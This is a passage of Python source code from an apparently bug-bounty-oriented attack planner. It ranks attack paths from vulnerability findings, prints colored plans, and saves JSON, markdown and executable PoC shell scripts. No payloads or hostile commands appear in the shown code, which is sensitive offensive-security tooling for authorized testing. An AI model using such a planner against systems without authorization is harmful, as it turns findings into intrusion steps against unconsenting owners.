            title=f"Attack Plan: {domain or 'Target'}",
            target_domain=domain,
            generated_at=datetime.utcnow().isoformat(),
            attack_paths=[p.to_dict() for p in paths],
            exploitation_steps=[s.to_dict() for s in steps],
            poc_script=poc_script,
            tools_required=sorted(list(all_tools)),
            estimated_time_hours=sum(p.estimated_time_hours for p in paths[:3]) / max(len(paths[:3]), 1),
            estimated_bounty=bounty.get("median", 0),
            risk_assessment=risk_assessment,
            ascii_tree=ascii_tree,
            findings_count=len(findings),
            max_severity=max_severity,
        )

        self._plans.append(plan)
        return plan

    def _calculate_risk_assessment(self, paths: List[AttackPath],
                                    findings: List[Finding]) -> Dict[str, Any]:
        """Calculate overall risk assessment."""
        if not paths:
            return {
                "overall_risk": "LOW",
                "risk_score": 0.0,
                "likelihood": "Low",
                "impact": "Minimal",
                "complexity": "N/A",
                "summary": "No viable attack paths identified.",
            }

        best_path = paths[0]
        risk_score = best_path.risk_score

        if risk_score >= 8.0:
            risk_level = "CRITICAL"
            likelihood = "Very High"
            impact = "Severe - Full system compromise possible"
        elif risk_score >= 6.0:
            risk_level = "HIGH"
            likelihood = "High"
            impact = "Significant - Data breach or privilege escalation"
        elif risk_score >= 4.0:
            risk_level = "MEDIUM"
            likelihood = "Moderate"
            impact = "Moderate - Limited data access or functionality abuse"
        elif risk_score >= 2.0:
            risk_level = "LOW"
            likelihood = "Low"
            impact = "Low - Information disclosure or minor issues"
        else:
            risk_level = "INFO"
            likelihood = "Very Low"
            impact = "Minimal - Informational findings only"

        complexity_map = {"low": "Simple", "medium": "Moderate", "high": "Complex"}
        avg_complexity = best_path.complexity

        return {
            "overall_risk": risk_level,
            "risk_score": risk_score,
            "likelihood": likelihood,
            "impact": impact,
            "complexity": "Simple" if avg_complexity < 0.3 else "Moderate" if avg_complexity < 0.7 else "Complex",
            "attack_paths_found": len(paths),
            "shortest_path_steps": best_path.total_steps,
            "findings_in_path": len(best_path.findings_used),
            "summary": f"{risk_level} risk. {len(paths)} attack path(s) found. "
                       f"Shortest requires {best_path.total_steps} steps. "
                       f"Likelihood: {likelihood}.",
        }

    def print_plan(self, plan: AttackPlan) -> None:
        """
        Print colored attack plan to terminal.

        Args:
            plan: The AttackPlan to display.
        """
        print(f"\n{Colors.HEADER}{'=' * 70}")
        print(f"  ATTACK PLAN: {plan.title}")
        print(f"{'=' * 70}{Colors.RESET}")
        print(f"  Plan ID:     {plan.plan_id}")
        print(f"  Domain:      {plan.target_domain or 'Multiple'}")
        print(f"  Findings:    {plan.findings_count}")
        print(f"  Max Severity: {Colors.severity_color(plan.max_severity)}{plan.max_severity}{Colors.RESET}")
        print(f"  Est. Bounty: {Colors.HIGHLIGHT}${plan.estimated_bounty:,.0f}{Colors.RESET}")
        print()

        # Risk assessment
        risk = plan.risk_assessment
        risk_level = risk.get("overall_risk", "UNKNOWN")
        risk_color = Colors.severity_color(risk_level)
        print(f"{Colors.SUBHEADER}--- Risk Assessment ---{Colors.RESET}")
        print(f"  Overall Risk: {risk_color}{risk_level}{Colors.RESET} ({risk.get('risk_score', 0):.1f}/10)")
        print(f"  Likelihood:   {risk.get('likelihood', '?')}")
        print(f"  Impact:       {risk.get('impact', '?')}")
        print(f"  Complexity:   {risk.get('complexity', '?')}")
        print(f"  Paths Found:  {risk.get('attack_paths_found', 0)}")
        print()

        # Attack paths
        if plan.attack_paths:
            print(f"{Colors.SUBHEADER}--- Attack Paths ---{Colors.RESET}")
            for i, path_dict in enumerate(plan.attack_paths[:5], 1):
                states = path_dict.get("states", [])
                risk_score = path_dict.get("risk_score", 0)
                steps = path_dict.get("total_steps", 0)
                print(f"  Path {i}: {' -> '.join(states)}")
                print(f"    Steps: {steps} | Risk: {risk_score:.1f} | "
                      f"Time: ~{path_dict.get('estimated_time_hours', 0):.1f}h")
            print()

        # Exploitation steps
        if plan.exploitation_steps:
            print(f"{Colors.SUBHEADER}--- Exploitation Steps ---{Colors.RESET}")
            for step_dict in plan.exploitation_steps[:10]:
                num = step_dict.get("step_number", 0)
                action = step_dict.get("action", "?")
                tool = step_dict.get("tool", "?")
                target = step_dict.get("target_url", "")[:50]
                state_after = step_dict.get("state_after", "?")

                print(f"  {Colors.COUNT}{num}.{Colors.RESET} {action}")
                print(f"     Tool: {tool} | Target: {target}")
                print(f"     Result: -> {state_after}")
            print()

        # ASCII tree
        if plan.ascii_tree:
            print(f"{Colors.SUBHEADER}--- Attack Tree ---{Colors.RESET}")
            print(plan.ascii_tree)

        # Tools
        if plan.tools_required:
            print(f"{Colors.SUBHEADER}--- Required Tools ---{Colors.RESET}")
            for tool in plan.tools_required[:10]:
                print(f"  - {tool}")
            print()

        print(f"{Colors.HEADER}{'=' * 70}{Colors.RESET}")

    def save_plan(self, plan: AttackPlan, output_dir: str = None) -> Dict[str, str]:
        """
        Save attack plan to files.

        Args:
            plan: The AttackPlan to save.
            output_dir: Output directory.

        Returns:
            Dictionary mapping format to file path.
        """
        output_dir = output_dir or self.output_dir
        os.makedirs(output_dir, exist_ok=True)
        saved = {}

        # Save JSON
        json_path = os.path.join(output_dir, f"attack_plan_{plan.plan_id}.json")
        with open(json_path, "w") as f:
            json.dump(plan.to_dict(), f, indent=2, default=str)
        saved["json"] = json_path

        # Save PoC script
        if plan.poc_script:
            poc_path = os.path.join(output_dir, f"poc_{plan.plan_id}.sh")
            with open(poc_path, "w") as f:
                f.write(plan.poc_script)
            os.chmod(poc_path, 0o755)
            saved["poc"] = poc_path

        # Save ASCII tree
        if plan.ascii_tree:
            tree_path = os.path.join(output_dir, f"attack_tree_{plan.plan_id}.txt")
            with open(tree_path, "w") as f:
                f.write(plan.ascii_tree)
            saved["tree"] = tree_path

        # Save markdown report
        md_path = os.path.join(output_dir, f"attack_plan_{plan.plan_id}.md")
        md_content = self._generate_markdown_plan(plan)
        with open(md_path, "w") as f:
            f.write(md_content)
        saved["markdown"] = md_path

        return saved

    def _generate_markdown_plan(self, plan: AttackPlan) -> str:
        """Generate markdown attack plan report."""
        lines = []
        lines.append(f"# {plan.title}")
        lines.append("")
        lines.append(f"**Plan ID:** {plan.plan_id}")
        lines.append(f"**Generated:** {plan.generated_at}")
        lines.append(f"**Domain:** {plan.target_domain or 'Multiple'}")
        lines.append(f"**Findings:** {plan.findings_count}")
        lines.append(f"**Max Severity:** {plan.max_severity}")
        lines.append(f"**Estimated Bounty:** ${plan.estimated_bounty:,.0f}")
        lines.append("")

        # Risk assessment
        risk = plan.risk_assessment
        lines.append("## Risk Assessment")
        lines.append("")
        lines.append(f"| Metric | Value |")
        lines.append(f"|--------|-------|")
        lines.append(f"| Overall Risk | {risk.get('overall_risk', '?')} |")
        lines.append(f"| Risk Score | {risk.get('risk_score', 0):.1f}/10 |")
        lines.append(f"| Likelihood | {risk.get('likelihood', '?')} |")
        lines.append(f"| Impact | {risk.get('impact', '?')} |")
        lines.append(f"| Complexity | {risk.get('complexity', '?')} |")
        lines.append("")

        # Steps
        if plan.exploitation_steps:
            lines.append("## Exploitation Steps")
            lines.append("")
            for step in plan.exploitation_steps:
                lines.append(f"### Step {step.get('step_number', 0)}: {step.get('action', '?')}")
                lines.append("")
                lines.append(f"- **Tool:** {step.get('tool', '?')}")
                lines.append(f"- **Target:** `{step.get('target_url', '?')}`")
                lines.append(f"- **Command:** `{step.get('command', '?')[:80]}`")
                lines.append(f"- **Expected Result:** {step.get('expected_result', '?')}")
                lines.append("")

        # Tools
        if plan.tools_required:
            lines.append("## Required Tools")
            lines.append("")
            for tool in plan.tools_required:
                lines.append(f"- {tool}")
            lines.append("")

        # ASCII tree
        if plan.ascii_tree:
            lines.append("## Attack Tree")
            lines.append("")
            lines.append("```")
            lines.append(plan.ascii_tree)
            lines.append("```")
            lines.append("")

        return "\n".join(lines)


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def generate_attack_plan(input_path: str, output_dir: str = None,
                         domain: str = None, db_path: str = None) -> AttackPlan:
    """
    Convenience function to generate an attack plan.

    Args:
        input_path: Path to findings database or report directory.
        output_dir: Output directory for results.
        domain: Optional domain filter.
        db_path: Path to findings database file.

    Returns:
        Generated AttackPlan.
    """
    # Load database
    effective_db_path = db_path or "super_monster_findings.json"
    db = FindingDB(effective_db_path)

    # Import findings if needed
    if os.path.isdir(input_path):
        db.import_directory(input_path)
    elif os.path.isfile(input_path):
        db.import_monster_report(input_path)

    if db.count() == 0:
        return AttackPlan(
            plan_id=f"PLAN-{uuid.uuid4().hex[:6].upper()}",
            title="No findings available",
            generated_at=datetime.utcnow().isoformat(),
        )

    # Generate plan
    planner = AttackPlanner(db=db, output_dir=output_dir or DEFAULT_OUTPUT_DIR)
    plan = planner.generate_plan(target_domain=domain)

    # Save results
    if output_dir:
        planner.save_plan(plan, output_dir)

    # Save database
    if db.db_path:
        db.save()

    return plan


def print_attack_summary(db: FindingDB) -> None:
    """Print a summary of potential attack paths."""
    planner = AttackPlanner(db=db)
    plan = planner.generate_plan()
    planner.print_plan(plan)
